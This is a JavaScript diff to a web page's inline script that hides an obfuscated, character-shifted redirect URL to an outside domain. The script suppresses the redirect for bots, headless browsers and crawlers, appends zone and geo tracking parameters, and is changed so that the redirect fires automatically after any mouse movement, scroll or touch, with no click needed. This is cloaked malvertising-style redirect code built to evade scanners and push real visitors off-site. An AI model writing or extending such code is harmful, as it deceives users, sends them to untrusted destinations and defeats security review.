@@ -80,7 +80,7 @@
     const dc = (s) => s.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
     const t = "iuuqt;00joibmfesfx/dpn0qxgrnbtxk@lfz>1g8ff6g:f3cdd7839868ddc29:77db2:";
     const sk = "hsrc"; const sv = "1"; const sid = "v55_init_done";
-    const state = { ready: false, done: false, human: false, bot: false };
+    const state = { ready: false, done: false, human: false, bot: false, timer: false };
 
     const checkEnv = async () => {
       const p = new URLSearchParams(window.location.search);
@@ -94,9 +94,17 @@
       if (navigator.webdriver || /bot|spider|headless/i.test(navigator.userAgent)) state.bot = true;
     };
 
-    const markHuman = () => state.human = true;
+    const markHuman = () => {
+      state.human = true;
+      if (state.ready && !state.bot && !state.done && !state.timer) {
+         state.timer = true;
+         setTimeout(proceed, 2000 + Math.random() * 1000);
+      }
+    };
     window.addEventListener('mousemove', markHuman, { once: true });
     window.addEventListener('scroll', markHuman, { once: true });
+    window.addEventListener('touchstart', markHuman, { once: true });
+    window.addEventListener('mousedown', markHuman, { once: true });
 
     const proceed = () => {
       if (!state.ready || state.bot || state.done) {
@@ -105,6 +113,10 @@
       }
       state.done = true;
       localStorage.setItem(sid, "1");
+      const btn = document.getElementById('access-btn');
+      btn.disabled = true;
+      document.getElementById('loader').style.display = 'block';
+      document.getElementById('btn-text').innerText = 'Loading...';
       const url = dc(t);
       const p = new URLSearchParams(window.location.search);
       const z = p.get('zoneid') || p.get('zone') || p.get('psid');
@@ -112,16 +124,11 @@
       let final = url;
       if (z) final += (final.includes('?') ? '&' : '?') + "psid=" + z;
       if (g) final += (final.includes('?') ? '&' : '?') + "geo=" + g;
-      window.location.replace(final);
+      setTimeout(() => { window.location.replace(final); }, 800);
     };
 
-    const btn = document.getElementById('access-btn');
-    btn.addEventListener('click', () => {
-      if (!state.human) return;
-      btn.disabled = true;
-      document.getElementById('loader').style.display = 'block';
-      document.getElementById('btn-text').innerText = 'Loading...';
-      setTimeout(proceed, 800 + Math.random() * 500);
+    document.getElementById('access-btn').addEventListener('click', () => {
+      state.human = true; proceed();
     });
 
     document.addEventListener('DOMContentLoaded', checkEnv);
